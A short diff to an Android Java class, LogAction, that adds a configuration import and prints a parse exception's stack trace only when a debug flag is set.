@@ -14,6 +14,7 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.android.service.LogR;
+import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.util.DataBuffer;
@@ -64,7 +65,7 @@ public class LogAction extends SubAction {
 			this.msg = WChar.getString(buffer, true);
 		} catch (IOException io) {
 			Log.d("QZ",TAG + " Info: " + "parse() exception");
-			io.printStackTrace();
+			if(Configuration.DEBUG) { io.printStackTrace(); }
 		}
 
 		return true;
